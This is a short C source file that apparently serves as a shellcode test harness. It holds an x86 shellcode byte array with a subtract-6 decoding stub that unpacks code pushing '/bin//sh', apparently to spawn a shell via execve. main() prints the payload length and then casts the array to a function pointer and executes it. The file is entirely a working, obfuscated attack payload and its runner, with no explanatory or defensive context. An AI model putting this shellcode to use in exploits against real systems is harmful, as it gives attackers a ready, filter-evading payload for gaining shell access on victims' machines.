#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x2e\x06\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x37\xc6\x56\x6e\x74\x35\x79\x6e\x6e\x35\x35\x68\x6f\x8f\xe9\x56\x8f\xe7\x59\x8f\xe8\xb6\x11\xd3\x86";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
